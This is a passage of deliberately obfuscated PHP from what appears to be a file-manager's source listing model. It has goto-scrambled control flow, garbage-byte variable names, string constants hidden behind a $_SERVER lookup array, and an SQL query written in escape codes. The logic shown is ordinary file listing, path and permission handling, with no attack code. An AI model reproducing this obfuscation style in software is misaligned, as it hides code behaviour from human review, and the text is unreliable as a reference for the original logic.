cÌÑÜˆÃ‰Ü; A™Ï×ÚÌŠ×: $this->_listAppendPath($a–¯›İìî); $this->_listAppendAuth($a–¯›İìî); $this->_listAppendSourceInfo($a–¯›İìî, $BëÙÆÎ÷“¾); goto dÈ¢˜ï…ƒ‚; cÌÑÜˆÃ‰Ü: $BëÙÆÎ÷“¾ = array_unique($BëÙÆÎ÷“¾); $this->_listSourceCache($a–¯›İìî); if (!$Eá±ÑÌ”áë) { $this->_listAppendMeta($a–¯›İìî, $BëÙÆÎ÷“¾); $this->_listAppendFileMeta($a–¯›İìî, $BëÙÆÎ÷“¾); $this->_listAppendChildren($a–¯›İìî, $BëÙÆÎ÷“¾); } goto A™Ï×ÚÌŠ×; dÈ¢˜ï…ƒ‚: $this->_listAppendUser($a–¯›İìî); $this->_listFilterInfo($a–¯›İìî, $Eá±ÑÌ”áë); goto e‹á÷Â–À; e‹á÷Â–À: } protected function _listSourceCache($DÁè¹ê¤Á¯) { $BâŠ³“²¨¢ =& $_SERVER[»„]; foreach ($DÁè¹ê¤Á¯ as $FÚ“¶Ë¯ÈŞ) { self::$cacheSourceInfo[$BâŠ³“²¨¢[406] . $FÚ“¶Ë¯ÈŞ[$BâŠ³“²¨¢[365]]] = $FÚ“¶Ë¯ÈŞ; } } protected function _listFilterInfo(&$AÇãÏ³ ¸Ø, $AÌ©ŠÀ³š = false) { $dØôÅšğÄ =& $_SERVER[»„]; foreach ($AÇãÏ³ ¸Ø as &$cá¢èíºİ¾) { $cá¢èíºİ¾ = $this->pathInfoFilter($cá¢èíºİ¾); self::$cachePathInfo[$dØôÅšğÄ[407] . intval($AÌ©ŠÀ³š) . $dØôÅšğÄ[408] . $cá¢èíºİ¾[$dØôÅšğÄ[365]]] = $cá¢èíºİ¾; } } protected function _listMake(&$aæŠ¦ÎÏñ—) { $Bö×ò‡‰„Å =& $_SERVER[»„]; $aæŠ¦ÎÏñ—[$Bö×ò‡‰„Å[74]] = array(); $aæŠ¦ÎÏñ—[$Bö×ò‡‰„Å[73]] = array(); foreach ($aæŠ¦ÎÏñ—[$Bö×ò‡‰„Å[350]] as $d‰×ò»ù…¬) { $Bº¶äˆ¯¬Â = $d‰×ò»ù…¬[$Bö×ò‡‰„Å[366]] == 1 ? $Bö×ò‡‰„Å[74] : $Bö×ò‡‰„Å[73]; $aæŠ¦ÎÏñ—[$Bº¶äˆ¯¬Â][] = $d‰×ò»ù…¬; } unset($aæŠ¦ÎÏñ—[$Bö×ò‡‰„Å[350]]); } protected function _listAppendMeta(&$a—•áÕõ×§, $f–‹±…ÓÃÃ) { goto A‰í¯Ñ‹»õ; A„çŞİØµ¤: foreach ($e¢¤·‚ÃØÊ as $E«ì‘²²¼) { if (!isset($a©½‡¶£‘[$E«ì‘²²¼[$aÖÎ¯‚ƒÄ[365]]])) { $a©½‡¶£‘[$E«ì‘²²¼[$aÖÎ¯‚ƒÄ[365]]] = array(); } if (in_array($E«ì‘²²¼[$aÖÎ¯‚ƒÄ[89]], $e·‰ßøÑ¥)) { continue; } $a©½‡¶£‘[$E«ì‘²²¼[$aÖÎ¯‚ƒÄ[365]]][$E«ì‘²²¼[$aÖÎ¯‚ƒÄ[89]]] = $E«ì‘²²¼[$aÖÎ¯‚ƒÄ[355]]; } foreach ($a—•áÕõ×§ as &$F“×çöĞ¯é) { $F“×çöĞ¯é[$aÖÎ¯‚ƒÄ[413]] = !1; if (isset($a©½‡¶£‘[$F“×çöĞ¯é[$aÖÎ¯‚ƒÄ[365]]])) { $F“×çöĞ¯é[$aÖÎ¯‚ƒÄ[413]] = $a©½‡¶£‘[$F“×çöĞ¯é[$aÖÎ¯‚ƒÄ[365]]]; } if ($this->fileIsLock($F“×çöĞ¯é) && $F“×çöĞ¯é[$aÖÎ¯‚ƒÄ[372]]) { $BÔĞôî•´« = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $F“×çöĞ¯é[$aÖÎ¯‚ƒÄ[372]][$aÖÎ¯‚ƒÄ[373]] = AuthModel::authDisable($F“×çöĞ¯é[$aÖÎ¯‚ƒÄ[372]][$aÖÎ¯‚ƒÄ[373]], $BÔĞôî•´«); $F“×çöĞ¯é[$aÖÎ¯‚ƒÄ[372]][$aÖÎ¯‚ƒÄ[414]][$aÖÎ¯‚ƒÄ[372]] = $F“×çöĞ¯é[$aÖÎ¯‚ƒÄ[372]][$aÖÎ¯‚ƒÄ[373]]; } } goto FçùÏÆ•Œ¦; A‰í¯Ñ‹»õ: $aÖÎ¯‚ƒÄ =& $_SERVER[»„]; $A¿”‡Ë‘“¼ = array($aÖÎ¯‚ƒÄ[379] => array($aÖÎ¯‚ƒÄ[380], $f–‹±…ÓÃÃ)); $e¢¤·‚ÃØÊ = Model($aÖÎ¯‚ƒÄ[409])->field($aÖÎ¯‚ƒÄ[410])->where($A¿”‡Ë‘“¼)->select(); goto E‡ˆ”îã—; E‡ˆ”îã—: if (!$e¢¤·‚ÃØÊ) { return; } $e·‰ßøÑ¥ = array($aÖÎ¯‚ƒÄ[411], $aÖÎ¯‚ƒÄ[412]); $a©½‡¶£‘ = array(); goto A„çŞİØµ¤; FçùÏÆ•Œ¦: } protected function _listAppendFileMeta(&$Fé¸Ø—“¬, $a˜Åá“¥İÓ) { goto A¯ŞÄÓ“²; e§ù­¾Á: foreach ($Fé¸Ø—“¬ as &$e¿İÀÍé½æ) { goto A‡ÎİÏ¢ò; B¢•È›ˆÀÉ: $Aëéçê‰Ê°[$c·âóÇ’Í[77]] = $e¿İÀÍé½æ[$c·âóÇ’Í[77]]; $Aëéçê‰Ê°[$c·âóÇ’Í[28]] = $e¿İÀÍé½æ[$c·âóÇ’Í[28]]; self::$cacheFileInfo[$c·âóÇ’Í[421] . $DÑêßíêÃË] = $Aëéçê‰Ê°; goto A©¤Á²›ïô; dÕ””ƒÅÙ: if (isset($e¿İÀÍé½æ[$c·âóÇ’Í[158]][$c·âóÇ’Í[422]])) { $e¿İÀÍé½æ[$c·âóÇ’Í[422]] = json_decode($e¿İÀÍé½æ[$c·âóÇ’Í[158]][$c·âóÇ’Í[422]], !0); unset($e¿İÀÍé½æ[$c·âóÇ’Í[158]][$c·âóÇ’Í[422]]); } goto b•¿¶î”ğé; A‡ÎİÏ¢ò: $DÑêßíêÃË = $e¿İÀÍé½æ[$c·âóÇ’Í[415]]; if (!$DÑêßíêÃË || !isset($d×·×öİ¥[$DÑêßíêÃË])) { continue; } $Aëéçê‰Ê° = $d×·×öİ¥[$DÑêßíêÃË]; goto B¢•È›ˆÀÉ; A©¤Á²›ïô: unset($d×·×öİ¥[$DÑêßíêÃË][$c·âóÇ’Í[75]]); $FÀ“‚âÙĞ« = is_array($Aã÷’ÀÅà‹[$DÑêßíêÃË]) ? $Aã÷’ÀÅà‹[$DÑêßíêÃË] : array(); $e¿İÀÍé½æ[$c·âóÇ’Í[158]] = array_merge($FÀ“‚âÙĞ«, $d×·×öİ¥[$DÑêßíêÃË]); goto dÕ””ƒÅÙ; b•¿¶î”ğé: } goto AÆâ»¯ë¥; fÆÎ¤Š¼‰ß: $d½Ñ˜šœë = $d½Ñ˜šœë ? $d½Ñ˜šœë : array(); $Aã÷’ÀÅà‹ = array(); foreach ($d½Ñ˜šœë as $aÑ±ñÊ·í¿) { if (!isset($Aã÷’ÀÅà‹[$aÑ±ñÊ·í¿[$c·âóÇ’Í[415]]])) { $Aã÷’ÀÅà‹[$aÑ±ñÊ·í¿[$c·âóÇ’Í[415]]] = array(); } $Aã÷’ÀÅà‹[$aÑ±ñÊ·í¿[$c·âóÇ’Í[415]]][$aÑ±ñÊ·í¿[$c·âóÇ’Í[89]]] = $aÑ±ñÊ·í¿[$c·âóÇ’Í[355]]; } goto e§ù­¾Á; a½»øòÍöŸ: $d×·×öİ¥ = Model($c·âóÇ’Í[418])->field($cëç‹ğÆ»ä)->where($B“«ÅÁÈç’)->select(); $d×·×öİ¥ = array_to_keyvalue($d×·×öİ¥, $c·âóÇ’Í[415]); $d½Ñ˜šœë = Model($c·âóÇ’Í[419])->field($c·âóÇ’Í[420])->where($B“«ÅÁÈç’)->select(); goto fÆÎ¤Š¼‰ß; A¯ŞÄÓ“²: $c·âóÇ’Í =& $_SERVER[»„]; $E‚ÄÄùÉßÓ = array_to_keyvalue($Fé¸Ø—“¬, $c·âóÇ’Í[33], $c·âóÇ’Í[415]); $E‚ÄÄùÉßÓ = array_filter(array_unique($E‚ÄÄùÉßÓ)); goto dÔõ¯ÚæˆÃ; dÔõ¯ÚæˆÃ: if (!$E‚ÄÄùÉßÓ) { return; } $B“«ÅÁÈç’ = array($c·âóÇ’Í[416] => array($c·âóÇ’Í[380], $E‚ÄÄùÉßÓ)); $cëç‹ğÆ»ä = $c·âóÇ’Í[417]; goto a½»øòÍöŸ; AÆâ»¯ë¥: } protected function _listAppendSourceInfo(&$B¬Şã‚ØšÔ, $D°”ğ¡‰ô) { goto e·… ‹†ÄŞ; dñ‘‚Ãƒö: $FòÊçè—Ò = array_to_keyvalue_group($DÀ„¯‘Å©›, $D¹§™ŸˆåŠ[365]); foreach ($B¬Şã‚ØšÔ as &$FÙÍÂ©§’Î) { $FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[387]] = array($D¹§™ŸˆåŠ[426] => 0, $D¹§™ŸˆåŠ[427] => 0, $D¹§™ŸˆåŠ[428] => 0); if (isset($FåÖÈæõÍµ[$FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[365]]])) { $FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[387]][$D¹§™ŸˆåŠ[429]] = 1; $FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[387]][$D¹§™ŸˆåŠ[430]] = $FåÖÈæõÍµ[$FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[365]]][$D¹§™ŸˆåŠ[28]]; } if (isset($f‡æÆÚÙ—[$FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[365]]])) { $FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[387]][$D¹§™ŸˆåŠ[431]] = array(); foreach ($f‡æÆÚÙ—[$FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[365]]] as $F¥‡í¦ÖêÀ) { $F·Ê¶›õ•Ò = $C…Ğ§”ò[$F¥‡í¦ÖêÀ]; $FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[387]][$D¹§™ŸˆåŠ[431]][] = array($D¹§™ŸˆåŠ[432] => $F·Ê¶›õ•Ò[$D¹§™ŸˆåŠ[363]], $D¹§™ŸˆåŠ[382] => $F·Ê¶›õ•Ò[$D¹§™ŸˆåŠ[28]], $D¹§™ŸˆåŠ[433] => $F·Ê¶›õ•Ò[$D¹§™ŸˆåŠ[434]]); } } if (isset($FòÊçè—Ò[$FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[365]]])) { $FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[387]][$D¹§™ŸˆåŠ[435]] = array(); foreach ($FòÊçè—Ò[$FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[365]]] as $B•«Ûøš­¯) { $FÙÍÂ©§’Î[$D¹§™ŸˆåŠ[387]][$D¹§™ŸˆåŠ[435]] = array($D¹§™ŸˆåŠ[436] => $B•«Ûøš­¯[$D¹§™ŸˆåŠ[437]], $D¹§™ŸˆåŠ[438] => $B•«Ûøš­¯[$D¹§™ŸˆåŠ[439]], $D¹§™ŸˆåŠ[440] => $B•«Ûøš­¯[$D¹§™ŸˆåŠ[365]], $D¹§™ŸˆåŠ[441] => $B•«Ûøš­¯[$D¹§™ŸˆåŠ[442]], $D¹§™ŸˆåŠ[443] => $B•«Ûøš­¯[$D¹§™ŸˆåŠ[444]]); } } } return $B¬Şã‚ØšÔ; goto B‚òÎŠ±èñ; cè‘¢˜–Â: $DÇˆÓàí©Ë = Model($D¹§™ŸˆåŠ[388])->listData(); $aî¶òá‘ƒµ = Model($D¹§™ŸˆåŠ[377])->listData(); $DÀ„¯‘Å©› = Model($D¹§™ŸˆåŠ[425])->listSimple(); goto cä†ñÜªŸš; e·… ‹†ÄŞ: $D¹§™ŸˆåŠ =& $_SERVER[»„]; if (!defined($D¹§™ŸˆåŠ[423])) { return; } $FÌ»ªËí“§ = Model($D¹§™ŸˆåŠ[424])->listData(); goto cè‘¢˜–Â; cä†ñÜªŸš: $C…Ğ§”ò = array_to_keyvalue($FÌ»ªËí“§, $D¹§™ŸˆåŠ[363]); $f‡æÆÚÙ— = array_to_keyvalue_group($DÇˆÓàí©Ë, $D¹§™ŸˆåŠ[75], $D¹§™ŸˆåŠ[389]); $FåÖÈæõÍµ = array_to_keyvalue($aî¶òá‘ƒµ, $D¹§™ŸˆåŠ[75]); goto dñ‘‚Ãƒö; B‚òÎŠ±èñ: } protected function _listAppendChildren(&$Dö¯´öïŠÙ, $Fİªˆç«ÍÀ) { goto dê“äŞÅÚ‡; dê“äŞÅÚ‡: $a£Ç‰ ª‚ =& $_SERVER[»„]; $cÕ—ÀëÔÏÉ = $a£Ç‰ ª‚[357]; $d»ÍŒˆ­Ú = array(); goto DçÎ¨ŒëåÀ; eËĞí‹Ğ¦ï: foreach ($Dö¯´öïŠÙ as &$b¹È½ñÑòğ) { if ($b¹È½ñÑòğ[$a£Ç‰ ª‚[366]]) { unset($b¹È½ñÑòğ[$a£Ç‰ ª‚[368]]); $b¹È½ñÑòğ[$a£Ç‰ ª‚[188]] = intval($d»ÍŒˆ­Ú[$b¹È½ñÑòğ[$a£Ç‰ ª‚[365]] . $a£Ç‰ ª‚[447]][$a£Ç‰ ª‚[448]]); $b¹È½ñÑòğ[$a£Ç‰ ª‚[187]] = intval($d»ÍŒˆ­Ú[$b¹È½ñÑòğ[$a£Ç‰ ª‚[365]] . $a£Ç‰ ª‚[449]][$a£Ç‰ ª‚[448]]); } } goto câÂâîİÎ; A»˜é×ÕÜØ: $eŠâ†ãçØ± = $this->tablePrefix . $this->tableName; for ($A‡»Ãá¦º = 0; $A‡»Ãá¦º < $Fëë¼•Ø±¬; $A‡»Ãá¦º++) { $b®Ü¢¤ŞÔ = intval($Dö¯´öïŠÙ[$A‡»Ãá¦º][$a£Ç‰ ª‚[393]]); if ($Dö¯´öïŠÙ[$A‡»Ãá¦º][$a£Ç‰ ª‚[366]]) { $CãÀÇÈ¼¶ = $Dö¯´öïŠÙ[$A‡»Ãá¦º][$a£Ç‰ ª‚[365]]; $cÕ—ÀëÔÏÉ .= "\123\x45\x4c\x45\x43\124\x20\x2a\40\x46\x52\x4f\115\x20\50\123\x45\114\x45\x43\124\x20\47{$CãÀÇÈ¼¶}\x5f\x68\141\163\x46\151\154\x65\x27\40\141\163\40\x68\141\x73\x2c\143\x6f\x75\x6e\164\50\61\51\x20\x61\x73\40\x68\x61\x73\103\157\165\156\x74\x20\106\x52\117\x4d\40\140{$eŠâ†ãçØ±}\x60\40\12\x9\11\x9\x9\11\x77\x68\145\162\145\40\x70\x61\x72\145\x6e\x74\111\x44\x3d{$CãÀÇÈ¼¶}\40\141\x6e\x64\x20\x69\163\106\157\x6c\x64\x65\x72\x3d\60\40\x61\x6e\144\x20\x69\x73\x44\145\154\x65\164\145\x3d{$b®Ü¢¤ŞÔ}\x29\40\x61\x73\40\x74\142\x31\137{$CãÀÇÈ¼¶}\x20\x75\156\x69\x6f\x6e\x20\x61\x6c\154\40\xa\x9\x9\x9\x9\11\123\105\114\x45\103\x54\x20\52\40\x46\122\117\115\x20\50\123\x45\114\105\x43\124\x20\x27{$CãÀÇÈ¼¶}\x5f\x68\141\x73\x46\x6f\x6c\x64\145\162\x27\x20\x61\x73\x20\x68\141\163\106\x69\x6c\145\54\x63\157\165\x6e\x74\x28\x31\51\40\x61\163\x20\150\x61\x73\103\157\x75\x6e\x74\40\106\122\117\115\40\140{$eŠâ†ãçØ±}\140\x20\12\x9\x9\11\11\11\x77\150\145\162\x65\x20\x70\141\162\x65\156\164\111\104\75{$CãÀÇÈ¼¶}\x20\141\156\x64\x20\x69\x73\106\x6f\x6c\x64\x65\162\75\61\40\141\x6e\x64\x20\x69\163\x44\145\154\x65\x74\x65\75{$b®Ü¢¤ŞÔ}\51\x20\x61\163\x20\164\x62\x32\x5f{$CãÀÇÈ¼¶}\40\165\x6e\151\157\156\x20\141\154\154\x20"; } if ((strlen($cÕ—ÀëÔÏÉ) >= $Fì¬ƒ³õ¥ || $A‡»Ãá¦º == $Fëë¼•Ø±¬ - 1) && $cÕ—ÀëÔÏÉ) { $cÕ—ÀëÔÏÉ = substr($cÕ—ÀëÔÏÉ, 0, -strlen($a£Ç‰ ª‚[445])); $B¡õµ¹†Š = $this->query($cÕ—ÀëÔÏÉ); $d»ÍŒˆ­Ú = array_merge($d»ÍŒˆ­Ú, $B¡õµ¹†Š); $cÕ—ÀëÔÏÉ = $a£Ç‰ ª‚[33]; } } $d»ÍŒˆ­Ú = array_to_keyvalue($d»ÍŒˆ­Ú, $a£Ç‰ ª‚[446]); goto eËĞí‹Ğ¦ï; DçÎ¨ŒëåÀ: $Fì¬ƒ³õ¥ = 1024 * 50; $Dö¯´öïŠÙ = is_array($Dö¯´öïŠÙ) ? $Dö¯´öïŠÙ : array(); $Fëë¼•Ø±¬ = count($Dö¯´öïŠÙ); goto A»˜é×ÕÜØ; câÂâîİÎ: } protected function _listAppendAuth(&$fŒäƒŠ·«Í) { goto D¸Ë¬•Û™; D¸Ë¬•Û™: $CÓ£”¤¡¾ê =& $_SERVER[»„]; if (!defined($CÓ£”¤¡¾ê[423])) { return; } $aÕ½ˆêŒá‘ = array(); goto d˜ğ•ë¡; d˜ğ•ë¡: foreach ($fŒäƒŠ·«Í as $DóÂñ¤¡) { if ($DóÂñ¤¡[$CÓ£”¤¡¾ê[367]] == self::TYPE_GROUP) { $aÕ½ˆêŒá‘[] = $DóÂñ¤¡[$CÓ£”¤¡¾ê[365]]; } } if (!$aÕ½ˆêŒá‘) { return; } $dƒÓ„Â¾‚« = array_to_keyvalue($fŒäƒŠ·«Í, $CÓ£”¤¡¾ê[365]); goto Aì¸¶ø¤äì; Aì¸¶ø¤äì: $D†òåÚ“Ş’ = Model($CÓ£”¤¡¾ê[450])->getSourceList($aÕ½ˆêŒá‘, $dƒÓ„Â¾‚«); foreach ($fŒäƒŠ·«Í as $a ¥šíÍ«‰ => &$DóÂñ¤¡) { $DóÂñ¤¡[$CÓ£”¤¡¾ê[372]] = $D†òåÚ“Ş’[$DóÂñ¤¡[$CÓ£”¤¡¾ê[365]]]; if (!$DóÂñ¤¡[$CÓ£”¤¡¾ê[372]] && $DóÂñ¤¡[$CÓ£”¤¡¾ê[367]] == self::TYPE_GROUP) { $DóÂñ¤¡[$CÓ£”¤¡¾ê[372]] = Action($CÓ£”¤¡¾ê[451])->pathGroupAuthMake($DóÂñ¤¡[$CÓ£”¤¡¾ê[452]]); if (!$DóÂñ¤¡[$CÓ£”¤¡¾ê[372]] && !_get($GLOBALS, $CÓ£”¤¡¾ê[453])) { $DóÂñ¤¡[$CÓ£”¤¡¾ê[185]] = !1; $DóÂñ¤¡[$CÓ£”¤¡¾ê[184]] = !1; } } if ($DóÂñ¤¡[$CÓ£”¤¡¾ê[372]]) { $DóÂñ¤¡[$CÓ£”¤¡¾ê[185]] = AuthModel::authCheckEdit($DóÂñ¤¡[$CÓ£”¤¡¾ê[372]][$CÓ£”¤¡¾ê[373]]); $DóÂñ¤¡[$CÓ£”¤¡¾ê[184]] = AuthModel::authCheckView($DóÂñ¤¡[$CÓ£”¤¡¾ê[372]][$CÓ£”¤¡¾ê[373]]); } $this->groupPathDisplay($DóÂñ¤¡); } goto eŒÆ–ˆŞœÏ; eŒÆ–ˆŞœÏ: } public function groupPathDisplay(&$AÀ”†ÕÚ–¶) { goto f—©éê—®; f—©éê—®: $dÜôñÓ¹åš =& $_SERVER[»„]; if ($AÀ”†ÕÚ–¶[$dÜôñÓ¹åš[367]] != self::TYPE_GROUP) { return; } $f‹×àÅâ‡² = Model($dÜôñÓ¹åš[454])->getInfo($AÀ”†ÕÚ–¶[$dÜôñÓ¹åš[452]]); goto e‹ç²ë¿ãå; dÊå¥²ï÷ò: $AÀ”†ÕÚ–¶[$dÜôñÓ¹åš[460]] = $B´—ø²¼äù . $f‹×àÅâ‡²[$dÜôñÓ¹åš[387]][$dÜôñÓ¹åš[365]]; goto aÙŠÆ‡·—ø; cÍÇŸëëŠ: $AÀ”†ÕÚ–¶[$dÜôñÓ¹åš[456]] = $f‹×àÅâ‡²[$dÜôñÓ¹åš[457]]; $AÀ”†ÕÚ–¶[$dÜôñÓ¹åš[376]] = $f‹×àÅâ‡²[$dÜôñÓ¹åš[455]]; $AÀ”†ÕÚ–¶[$dÜôñÓ¹åš[458]] = $f‹×àÅâ‡²[$dÜôñÓ¹åš[459]]; goto dÊå¥²ï÷ò; e‹ç²ë¿ãå: $e¼¹ï°ä¬÷ = $this->parentLevelArray($f‹×àÅâ‡²[$dÜôñÓ¹åš[455]]); $B´—ø²¼äù = $dÜôñÓ¹åš[33]; foreach ($e¼¹ï°ä¬÷ as $D²Œï‡¯åõ) { $bİåä³‰š = Model($dÜôñÓ¹åš[454])->getInfo($D²Œï‡¯åõ); $B´—ø²¼äù .= $bİåä³‰š[$dÜôñÓ¹åš[387]][$dÜôñÓ¹åš[365]] . $dÜôñÓ¹åš[47]; } goto cÍÇŸëëŠ; aÙŠÆ‡·—ø: } protected function _listAppendPath(&$dÎœ³·¸ø‡) { goto aˆÓ¹òŠ´ñ; aˆÓ¹òŠ´ñ: $B²êØ‚ô¼ =& $_SERVER[»„]; $C¦¿«³Â‡è = array(); foreach ($dÎœ³·¸ø‡ as &$d½øåÅ–Ú×) { $C¦¿«³Â‡è[$d½øåÅ–Ú×[$B²êØ‚ô¼[365]]] = $d½øåÅ–Ú×[$B²êØ‚ô¼[28]]; $b¶Åâš™èõ = $this->parentLevelArray($d½øåÅ–Ú×[$B²êØ‚ô¼[455]]); array_shift($b¶Åâš™èõ); foreach ($b¶Åâš™èõ as $dß‚ˆÃƒ¯½) { if (!isset($C¦¿«³Â‡è[$dß‚ˆÃƒ¯½])) { $C¦¿«³Â‡è[$dß‚ˆÃƒ¯½] = 0; } } } goto câº’×î; aëªìœˆò­: $e„çšÏÀ• = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($dÎœ³·¸ø‡ as &$d½øåÅ–Ú×) { goto b™íâ›è‹; b™íâ›è‹: $b¶Åâš™èõ = $this->parentLevelArray($d½øåÅ–Ú×[$B²êØ‚ô¼[455]]); $D¼æ—…Ï®½ = $this->_listAppendPathRoot($d½øåÅ–Ú×, $b¶Åâš™èõ); foreach ($b¶Åâš™èõ as $dß‚ˆÃƒ¯½) { if (isset($C¦¿«³Â‡è[$dß‚ˆÃƒ¯½])) { $D¼æ—…Ï®½ .= $C¦¿«³Â‡è[$dß‚ˆÃƒ¯½] . $B²êØ‚ô¼[8]; } } goto C×ãÛìƒ·¢; DŠ–¥«‘ã: $e·´‹øîíì = trim($d½øåÅ–Ú×[$B²êØ‚ô¼[462]], $B²êØ‚ô¼[8]); if ($d½øåÅ–Ú×[$B²êØ‚ô¼[457]] == $B²êØ‚ô¼[464] && $e·´‹øîíì) { $d½øåÅ–Ú×[$B²êØ‚ô¼[28]] = $e·´‹øîíì; } $this->_listAppendPathRecycle($d½øåÅ–Ú×, $b¶Åâš™èõ, $e„çšÏÀ•); goto CôÛ¢èİÏ…; C×ãÛìƒ·¢: if ($b¶Åâš™èõ) { $D¼æ—…Ï®½ .= $d½øåÅ–Ú×[$B²êØ‚ô¼[28]]; } if ($d½øåÅ–Ú×[$B²êØ‚ô¼[366]]) { $D¼æ—…Ï®½ .= $B²êØ‚ô¼[8]; } $d½øåÅ–Ú×[$B²êØ‚ô¼[462]] = str_replace($B²êØ‚ô¼[463], $B²êØ‚ô¼[8], $D¼æ—…Ï®½); goto DŠ–¥«‘ã; CôÛ¢èİÏ…: } goto DÍ¨‹¬ÖÎ; câº’×î: $BË¡ä÷©¾ = array(); foreach ($C¦¿«³Â‡è as $Fº ·òäÕ => $Aòµˆ¤ƒ„’) { if (!$Aòµˆ¤ƒ„’) { $BË¡ä÷©¾[] = $Fº ·òäÕ; } } if ($BË¡ä÷©¾) { $a½ÃÎ¡«« = array($B²êØ‚ô¼[379] => array($B²êØ‚ô¼[380], $BË¡ä÷©¾)); if (count($BË¡ä÷©¾) == 1) { $e±¬´Ê±¦½ = $this->sourceInfo($BË¡ä÷©¾[0]); $e±¬´Ê±¦½ = is_array($e±¬´Ê±¦½) ? array($e±¬´Ê±¦½) : !1; } else { $e±¬´Ê±¦½ = $this->field($B²êØ‚ô¼[461])->where($a½ÃÎ¡««)->select(); } $d‘´ö™ä­Ê = array_to_keyvalue($e±¬´Ê±¦½, $B²êØ‚ô¼[365], $B²êØ‚ô¼[28]); $C¦¿«³Â‡è = array_merge_index($C¦¿«³Â‡è, $d‘´ö™ä­Ê); } goto aëªìœˆò­; DÍ¨‹¬ÖÎ: } private function _listAppendPathRecycle(&$Aöœ‡…Ÿ‡, $B´ßœˆà‹ò, $bĞ†“˜¿¬œ) { goto B¡Á›®ŠàÑ; B¡Á›®ŠàÑ: $E›µ‰İ «Ï =& $_SERVER[»„]; if (intval($Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[367]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($bĞ†“˜¿¬œ, $B´ßœˆà‹ò) && $Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[365]] != $bĞ†“˜¿¬œ) { return; } goto B‘ÈÇç¬ÏÕ; B‘ÈÇç¬ÏÕ: $e öÛÃğÇ™ = explode($E›µ‰İ «Ï[8], trim($Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[462]], $E›µ‰İ «Ï[8])); $aïÌ¶†ç†ô = implode($E›µ‰İ «Ï[8], array_slice($e öÛÃğÇ™, 2)); $Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[462]] = $E›µ‰İ «Ï[8] . LNG($E›µ‰İ «Ï[465]) . $E›µ‰İ «Ï[8] . ltrim($aïÌ¶†ç†ô, $E›µ‰İ «Ï[8]); goto c‹ïªÏ«†; c‹ïªÏ«†: $Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[455]] = $E›µ‰İ «Ï[466] . implode($E›µ‰İ «Ï[47], array_slice($B´ßœˆà‹ò, 1)) . $E›µ‰İ «Ï[47]; if ($Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[365]] == $bĞ†“˜¿¬œ) { $Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[455]] = $E›µ‰İ «Ï[466]; $Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[457]] = $E›µ‰İ «Ï[464]; $Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[28]] = LNG($E›µ‰İ «Ï[465]); } $Aöœ‡…Ÿ‡[$E›µ‰İ «Ï[467]] = $E›µ‰İ «Ï[468]; goto ağù‚Œ›Ì½; ağù‚Œ›Ì½: } protected function _listAppendPathRoot(&$B®˜çâˆ², $c÷÷¹ƒÕ‡ ) { $Dæ¢¯«Íï± =& $_SERVER[»„]; $C¹óÛÆøà× = $Dæ¢¯«Íï±[33]; if ($B®˜çâˆ²[$Dæ¢¯«Íï±[367]] == self::TYPE_USER) { if (defined($Dæ¢¯«Íï±[423]) && $B®˜çâˆ²[$Dæ¢¯«Íï±[452]] == USER_ID) { $C¹óÛÆøà× = LNG($Dæ¢¯«Íï±[469]); if (!$c÷÷¹ƒÕ‡ ) { $B®˜çâˆ²[$Dæ¢¯«Íï±[28]] = $C¹óÛÆøà×; } } else { $bÛ¡½Ë™œ¦ = Model($Dæ¢¯«Íï±[470])->getInfoSimple($B®˜çâˆ²[$Dæ¢¯«Íï±[452]]); $C¹óÛÆøà× = LNG($Dæ¢¯«Íï±[471]) . $Dæ¢¯«Íï±[153] . $bÛ¡½Ë™œ¦[$Dæ¢¯«Íï±[28]] . $Dæ¢¯«Íï±[472]; } } else { if ($B®˜çâˆ²[$Dæ¢¯«Íï±[367]] == self::TYPE_GROUP) { $bÛ¡½Ë™œ¦ = Model($Dæ¢¯«Íï±[454])->getInfoSimple($B®˜çâˆ²[$Dæ¢¯«Íï±[452]]); $C¹óÛÆøà× = $bÛ¡½Ë™œ¦[$Dæ¢¯«Íï±[28]]; } else { if ($B®˜çâˆ²[$Dæ¢¯«Íï±[367]] == self::TYPE_SYSTEM) { $bÛ¡½Ë™œ¦ = $this->sourceInfo($c÷÷¹ƒÕ‡ [0], !0); $C¹óÛÆøà× = $bÛ¡½Ë™œ¦[$Dæ¢¯«Íï±[28]]; } } } $C¹óÛÆøà× = $C¹óÛÆøà× ? $Dæ¢¯«Íï±[8] . $C¹óÛÆøà× . $Dæ¢¯«Íï±[8] : $Dæ¢¯«Íï±[8]; return $C¹óÛÆøà×; } protected function _listAppendUser(&$Föˆ³”¤Ü) { $BöŒœÈ‘İ™ =& $_SERVER[»„]; $AÌÈø“ÖÏ˜ = array_to_keyvalue($Föˆ³”¤Ü, $BöŒœÈ‘İ™[33], $BöŒœÈ‘İ™[374]); $Dõ»•êõÒÄ = array_to_keyvalue($Föˆ³”¤Ü, $BöŒœÈ‘İ™[33], $BöŒœÈ‘İ™[375]); $CÉÈ†•é˜ = array_merge($AÌÈø“ÖÏ˜, $Dõ»•êõÒÄ); $cëˆ³ªÓƒÅ = Model($BöŒœÈ‘İ™[473])->userListInfo($CÉÈ†•é˜); foreach ($Föˆ³”¤Ü as &$a—å±›±´º) { $DÇ§½µà¹ = $a—å±›±´º[$BöŒœÈ‘İ™[374]]; $a—å±›±´º[$BöŒœÈ‘İ™[374]] = $cëˆ³ªÓƒÅ[$DÇ§½µà¹] ? 